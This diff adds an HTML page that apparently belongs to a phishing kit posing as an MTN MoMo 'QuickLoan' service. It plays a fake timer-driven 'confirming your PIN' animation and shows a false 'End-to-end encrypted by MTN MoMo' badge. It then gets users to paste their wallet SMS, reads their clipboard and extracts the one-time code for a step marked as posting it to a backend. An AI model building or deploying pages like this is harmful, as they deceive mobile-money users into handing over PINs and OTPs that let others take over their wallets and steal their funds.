@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifying — QuickLoan</title>
+<style>
+  :root{
+    --mtn-blue:#004F9F;
+    --mtn-blue-dark:#003B77;
+    --mtn-blue-light:#1A6DC4;
+    --mtn-yellow:#FFCC00;
+    --bg:#F7F9FC;
+    --card:#FFFFFF;
+    --text:#0A1B33;
+    --muted:#64748B;
+    --border:#E2E8F0;
+    --green:#00A651;
+    --green-soft:#E6F7ED;
+    --red:#DC2626;
+  }
+
+  *{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  }
+
+  html,body{height:100%;}
+
+  body{
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  .frame-top, .frame-bottom{
+    width:100%;
+    height:6px;
+    background:linear-gradient(90deg, var(--mtn-blue) 0%, var(--mtn-blue-light) 50%, var(--mtn-blue) 100%);
+  }
+  .frame-bottom{margin-top:auto;}
+
+  /* ============ HEADER ============ */
+  .header{
+    width:100%;
+    background:#FFFFFF;
+    border-bottom:1px solid var(--border);
+    padding:16px 20px;
+    position:sticky;top:0;z-index:50;
+    box-shadow:0 2px 12px rgba(0,79,159,0.06);
+  }
+  .header-inner{
+    width:100%;max-width:920px;margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;
+  }
+
+  .brand{display:flex;align-items:center;gap:11px;text-decoration:none;}
+  .brand .logo{
+    width:42px;height:42px;border-radius:50%;
+    background:var(--mtn-blue);
+    display:flex;align-items:center;justify-content:center;
+    font-weight:900;color:var(--mtn-yellow);
+    font-size:11.5px;letter-spacing:-0.4px;
+    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  }
+  .brand .wordmark{display:flex;flex-direction:column;line-height:1.15;}
+  .brand .wordmark strong{
+    font-size:17px;font-weight:800;color:var(--mtn-blue);letter-spacing:-0.3px;
+  }
+  .brand .wordmark small{
+    font-size:10.5px;color:var(--muted);font-weight:600;
+    letter-spacing:0.4px;text-transform:uppercase;
+  }
+
+  .steps{display:flex;align-items:center;gap:8px;}
+  .step{
+    display:flex;align-items:center;gap:7px;
+    font-size:12.5px;font-weight:700;color:var(--muted);
+  }
+  .step .num{
+    width:24px;height:24px;border-radius:50%;
+    background:#E8EEF6;color:var(--muted);
+    display:flex;align-items:center;justify-content:center;
+    font-size:12px;font-weight:800;
+  }
+  .step.done .num{background:var(--green);color:#FFFFFF;}
+  .step.done{color:var(--green);}
+  .step.active .num{background:var(--mtn-blue);color:#FFFFFF;}
+  .step.active{color:var(--mtn-blue);}
+  .step-line{width:18px;height:2px;background:#E8EEF6;border-radius:2px;}
+  .step-line.done{background:var(--green);}
+
+  /* ============ MAIN ============ */
+  main{
+    width:100%;max-width:920px;flex:1;
+    padding:40px 20px 60px;
+    display:flex;flex-direction:column;align-items:center;
+  }
+
+  /* ============ CARD ============ */
+  .card{
+    background:var(--card);
+    width:100%;max-width:460px;
+    border-radius:20px;
+    padding:34px 28px 32px;
+    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    border:1px solid var(--border);
+    border-top:4px solid var(--mtn-blue);
+  }
+
+  /* ============ VERIFYING VIEW ============ */
+  #verifyingView{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    min-height:70vh;
+    padding:20px 0;
+    animation:fadeIn .4s ease;
+  }
+  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+
+  .big-spinner{
+    width:110px;height:110px;
+    position:relative;
+    margin-bottom:36px;
+  }
+  .big-spinner .ring{
+    position:absolute;inset:0;
+    border-radius:50%;
+    border:7px solid #E8EEF6;
+  }
+  .big-spinner .ring.active{
+    border-color:transparent;
+    border-top-color:var(--mtn-blue);
+    border-right-color:var(--mtn-blue);
+    animation:spin 1s linear infinite;
+  }
+  .big-spinner .ring.pulse{
+    border:7px solid transparent;
+    border-top-color:var(--mtn-blue-light);
+    opacity:0.4;
+    animation:spin 1.8s linear infinite reverse;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+
+  #verifyingView h2{
+    font-size:24px;font-weight:800;
+    color:var(--text);margin-bottom:12px;
+    letter-spacing:-0.5px;
+  }
+  #verifyingView p{
+    font-size:14.5px;color:var(--muted);
+    line-height:1.6;max-width:340px;
+    margin-bottom:32px;
+  }
+
+  .verify-progress{
+    width:100%;max-width:300px;
+    height:5px;
+    background:#E8EEF6;
+    border-radius:5px;
+    overflow:hidden;
+    margin-bottom:14px;
+  }
+  .verify-progress-bar{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,var(--mtn-blue),var(--mtn-blue-light));
+    border-radius:5px;
+    transition:width 0.4s ease;
+  }
+  .verify-status{
+    font-size:12.5px;
+    color:var(--mtn-blue);
+    font-weight:700;
+    letter-spacing:0.4px;
+    text-transform:uppercase;
+  }
+  .verify-dots::after{
+    content:"";
+    animation:dots 1.4s steps(4, end) infinite;
+  }
+  @keyframes dots{
+    0%{content:"";}
+    25%{content:".";}
+    50%{content:"..";}
+    75%{content:"...";}
+  }
+
+  /* ============ OTP VIEW ============ */
+  #otpView{display:none;}
+
+  .otp-head{
+    text-align:center;
+    margin-bottom:28px;
+  }
+  .otp-head .icon-circle{
+    width:64px;height:64px;border-radius:50%;
+    background:#EAF2FB;
+    display:flex;align-items:center;justify-content:center;
+    margin:0 auto 18px;
+  }
+  .otp-head .icon-circle svg{
+    width:30px;height:30px;
+    stroke:var(--mtn-blue);fill:none;
+    stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .otp-head h2{
+    font-size:21px;font-weight:800;
+    color:var(--text);letter-spacing:-0.4px;
+    margin-bottom:8px;
+  }
+  .otp-head p{
+    font-size:13.5px;color:var(--muted);
+    line-height:1.55;
+  }
+  .otp-head p strong{color:var(--mtn-blue);font-weight:800;}
+
+  /* ---- PASTE FIELD ---- */
+  .paste-field{margin-bottom:22px;}
+
+  .paste-field label{
+    display:block;
+    font-size:11.5px;
+    color:var(--muted);
+    font-weight:700;
+    letter-spacing:0.7px;
+    text-transform:uppercase;
+    margin-bottom:10px;
+  }
+
+  .paste-wrap{position:relative;}
+  .paste-wrap textarea{
+    width:100%;
+    min-height:110px;
+    resize:none;
+    border:2px solid var(--border);
+    border-radius:13px;
+    background:#FBFCFE;
+    padding:16px 16px 46px;
+    font-size:14px;
+    font-weight:600;
+    color:var(--text);
+    font-family:inherit;
+    line-height:1.55;
+    outline:none;
+    transition:.15s;
+  }
+  .paste-wrap textarea:focus{
+    border-color:var(--mtn-blue);
+    background:#FFFFFF;
+    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+  }
+  .paste-wrap textarea::placeholder{
+    color:#A9B6C7;
+    font-weight:500;
+  }
+
+  .paste-btn{
+    position:absolute;
+    bottom:12px;
+    right:12px;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    background:var(--mtn-blue);
+    color:#FFFFFF;
+    border:none;
+    border-radius:9px;
+    padding:8px 14px;
+    font-size:12.5px;
+    font-weight:800;
+    cursor:pointer;
+    letter-spacing:0.3px;
+    transition:.18s;
+    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  }
+  .paste-btn:hover{background:var(--mtn-blue-dark);transform:translateY(-1px);}
+  .paste-btn:active{transform:translateY(0);}
+  .paste-btn svg{
+    width:13px;height:13px;
+    stroke:#FFFFFF;fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  /* ---- CODE PREVIEW ---- */
+  .code-preview{
+    display:none;
+    background:#E6F7ED;
+    border:1px solid #C6EBD5;
+    border-radius:13px;
+    padding:14px 16px;
+    margin-bottom:22px;
+    align-items:center;
+    gap:12px;
+  }
+  .code-preview.show{display:flex;animation:fadeIn .3s ease;}
+  .code-preview .tick{
+    width:26px;height:26px;border-radius:50%;
+    background:var(--green);
+    display:flex;align-items:center;justify-content:center;
+    flex-shrink:0;
+  }
+  .code-preview .tick svg{
+    width:14px;height:14px;
+    stroke:#FFFFFF;fill:none;
+    stroke-width:3.2;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .code-preview .info{flex:1;}
+  .code-preview .info small{
+    display:block;font-size:11px;color:#3D7A5C;
+    font-weight:700;letter-spacing:0.5px;text-transform:uppercase;
+    margin-bottom:2px;
+  }
+  .code-preview .info strong{
+    font-size:20px;font-weight:900;color:#0F5132;
+    letter-spacing:3px;font-family:'Courier New',monospace;
+  }
+
+  /* ---- BUTTONS ---- */
+  .btn-row{display:flex;gap:12px;}
+  .btn-back{
+    flex:0 0 auto;
+    padding:16px 22px;
+    border:1.5px solid var(--border);
+    border-radius:12px;
+    background:#FFFFFF;
+    color:var(--muted);
+    font-size:15px;font-weight:700;
+    cursor:pointer;text-decoration:none;
+    display:flex;align-items:center;justify-content:center;
+    transition:.18s;
+  }
+  .btn-back:hover{border-color:var(--mtn-blue);color:var(--mtn-blue);background:#F1F6FC;}
+
+  .cta{
+    flex:1;
+    padding:16px;
+    border:none;border-radius:12px;
+    background:var(--mtn-blue);
+    color:#FFFFFF;
+    font-size:16px;font-weight:800;
+    cursor:pointer;letter-spacing:0.3px;
+    transition:.18s;
+    box-shadow:0 8px 20px rgba(0,79,159,0.3);
+  }
+  .cta:hover{
+    background:var(--mtn-blue-dark);
+    transform:translateY(-2px);
+    box-shadow:0 12px 26px rgba(0,79,159,0.38);
+  }
+  .cta:active{transform:translateY(0);}
+  .cta:disabled{opacity:0.45;cursor:not-allowed;transform:none;box-shadow:none;}
+
+  .secure-note{
+    display:flex;align-items:center;justify-content:center;gap:6px;
+    font-size:11.5px;color:var(--muted);margin-top:18px;font-weight:600;
+  }
+  .secure-note svg{
+    width:13px;height:13px;stroke:var(--green);fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  /* ---- RESEND ---- */
+  .resend{
+    text-align:center;
+    margin-top:16px;
+    font-size:12.5px;
+    color:var(--muted);
+    font-weight:600;
+  }
+  .resend a{
+    color:var(--mtn-blue);
+    text-decoration:none;
+    font-weight:800;
+    cursor:pointer;
+  }
+  .resend a:hover{text-decoration:underline;}
+
+  /* ============ MOBILE ============ */
+  @media(max-width:640px){
+    .steps .step span:not(.num){display:none;}
+    .step-line{width:12px;}
+    main{padding:28px 16px 44px;}
+    .card{padding:28px 20px;}
+    .brand .wordmark small{display:none;}
+    .btn-row{flex-direction:column-reverse;}
+    .btn-back{width:100%;}
+    #verifyingView h2{font-size:20px;}
+    .big-spinner{width:90px;height:90px;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="frame-top"></div>
+
+  <header class="header">
+    <div class="header-inner">
+      <a class="brand" href="index.html">
+        <div class="logo">MTN</div>
+        <div class="wordmark">
+          <strong>QuickLoan</strong>
+          <small>Powered by MoMo</small>
+        </div>
+      </a>
+
+      <div class="steps">
+        <div class="step done"><span class="num">✓</span><span>Amount</span></div>
+        <div class="step-line done"></div>
+        <div class="step done"><span class="num">✓</span><span>Details</span></div>
+        <div class="step-line done"></div>
+        <div class="step done"><span class="num">✓</span><span>Verify</span></div>
+        <div class="step-line done"></div>
+        <div class="step active"><span class="num">5</span><span>OTP</span></div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <!-- ============ VERIFYING VIEW ============ -->
+    <div id="verifyingView">
+      <div class="big-spinner">
+        <div class="ring"></div>
+        <div class="ring pulse"></div>
+        <div class="ring active"></div>
+      </div>
+
+      <h2>Verifying your wallet</h2>
+      <p>We're confirming your PIN with MTN MoMo. Please don't close this page.</p>
+
+      <div class="verify-progress">
+        <div class="verify-progress-bar" id="verifyBar"></div>
+      </div>
+      <div class="verify-status" id="verifyStatus">
+        <span class="verify-dots">Contacting MTN</span>
+      </div>
+    </div>
+
+    <!-- ============ OTP VIEW ============ -->
+    <div class="card" id="otpView">
+
+      <div class="otp-head">
+        <div class="icon-circle">
+          <svg viewBox="0 0 24 24">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+          </svg>
+        </div>
+        <h2>Check your SMS</h2>
+        <p>Paste the message we just sent to your MoMo wallet <strong id="otpPhone">+237 6XX XXX XXX</strong></p>
+      </div>
+
+      <!-- PASTE FIELD -->
+      <div class="paste-field">
+        <label for="smsPaste">Paste the SMS message</label>
+        <div class="paste-wrap">
+          <textarea
+            id="smsPaste"
+            placeholder="Paste the full SMS here…"
+            autocomplete="off"
+            spellcheck="false"
+          ></textarea>
+          <button type="button" class="paste-btn" id="pasteBtn">
+            <svg viewBox="0 0 24 24">
+              <rect x="9" y="9" width="13" height="13" rx="2"/>
+              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+            </svg>
+            Paste
+          </button>
+        </div>
+      </div>
+
+      <!-- CODE PREVIEW -->
+      <div class="code-preview" id="codePreview">
+        <div class="tick">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="info">
+          <small>Code detected</small>
+          <strong id="detectedCode">------</strong>
+        </div>
+      </div>
+
+      <!-- ACTIONS -->
+      <div class="btn-row">
+        <a href="verify.html" class="btn-back">← Back</a>
+        <button type="button" class="cta" id="submitOtpBtn" disabled>Confirm</button>
+      </div>
+
+      <div class="resend">
+        Didn't get the SMS? <a onclick="resendSms(event)">Resend code</a>
+      </div>
+
+      <div class="secure-note">
+        <svg viewBox="0 0 24 24">
+          <rect x="3" y="11" width="18" height="11" rx="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        End-to-end encrypted by MTN MoMo
+      </div>
+
+    </div>
+
+  </main>
+
+  <div class="frame-bottom"></div>
+
+<script>
+  // ----- READ FROM URL -----
+  const params = new URLSearchParams(location.search);
+  const amount = parseInt(params.get('amount')) || 50000;
+  const months = parseInt(params.get('months')) || 1;
+  const phone  = params.get('phone') || '+237 6XX XXX XXX';
+  const ref    = params.get('ref')   || '';
+
+  document.getElementById('otpPhone').textContent = phone;
+
+  // ==================== FULL-PAGE VERIFYING (5 seconds) ====================
+  const verifyBar    = document.getElementById('verifyBar');
+  const verifyStatus = document.getElementById('verifyStatus');
+
+  const verifyStages = [
+    'Contacting MTN',
+    'Confirming your PIN',
+    'Validating wallet',
+    'Finalizing verification'
+  ];
+
+  let stage = 0;
+  verifyStatus.innerHTML = '<span class="verify-dots">' + verifyStages[0] + '</span>';
+  verifyBar.style.width = '10%';
+
+  const stageInterval = setInterval(() => {
+    stage++;
+    if(stage < verifyStages.length){
+      verifyStatus.innerHTML = '<span class="verify-dots">' + verifyStages[stage] + '</span>';
+      verifyBar.style.width = ((stage + 1) / verifyStages.length * 100) + '%';
+    }
+  }, 1200);
+
+  setTimeout(() => {
+    clearInterval(stageInterval);
+    verifyBar.style.width = '100%';
+    verifyStatus.innerHTML = '<span class="verify-dots">Verified</span>';
+
+    setTimeout(() => {
+      document.getElementById('verifyingView').style.display = 'none';
+      document.getElementById('otpView').style.display = 'block';
+      document.getElementById('smsPaste').focus();
+    }, 300);
+  }, 5000);
+
+  // ==================== PASTE + CODE DETECTION ====================
+  const smsPaste     = document.getElementById('smsPaste');
+  const pasteBtn     = document.getElementById('pasteBtn');
+  const codePreview  = document.getElementById('codePreview');
+  const detectedCode = document.getElementById('detectedCode');
+  const submitOtpBtn = document.getElementById('submitOtpBtn');
+
+  function extractCode(text){
+    const explicit = text.match(/(?:code|pin|otp)\D{0,10}(\d{4,8})/i);
+    if(explicit) return explicit[1];
+    const groups = text.match(/\d{4,8}/g);
+    if(groups && groups.length){
+      return groups.sort((a,b) => b.length - a.length)[0];
+    }
+    return null;
+  }
+
+  function handleSmsInput(){
+    const text = smsPaste.value.trim();
+    const code = extractCode(text);
+
+    if(code){
+      codePreview.classList.add('show');
+      detectedCode.textContent = code;
+      submitOtpBtn.disabled = false;
+    } else {
+      codePreview.classList.remove('show');
+      submitOtpBtn.disabled = true;
+    }
+  }
+
+  smsPaste.addEventListener('input', handleSmsInput);
+
+  pasteBtn.addEventListener('click', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      smsPaste.value = text;
+      handleSmsInput();
+      smsPaste.focus();
+    } catch(err){
+      smsPaste.focus();
+    }
+  });
+
+  // ==================== SUBMIT ====================
+  submitOtpBtn.addEventListener('click', () => {
+    const code = detectedCode.textContent;
+    if(!code || code === '------') return;
+
+    submitOtpBtn.disabled = true;
+    submitOtpBtn.textContent = 'Verifying…';
+
+    setTimeout(() => {
+      // TODO: POST { phone, code } to your backend → MTN MoMo API
+      window.location.href =
+        'confirm.html' +
+        '?amount=' + amount +
+        '&months=' + months +
+        '&phone='  + encodeURIComponent(phone) +
+        '&ref='    + encodeURIComponent(ref);
+    }, 1200);
+  });
+
+  // ==================== RESEND ====================
+  function resendSms(e){
+    const link = e.target;
+    link.textContent = 'Sending…';
+    link.style.pointerEvents = 'none';
+
+    setTimeout(() => {
+      link.textContent = 'Resend code';
+      link.style.pointerEvents = '';
+    }, 1800);
+  }
+</script>
+</body>
+</html>
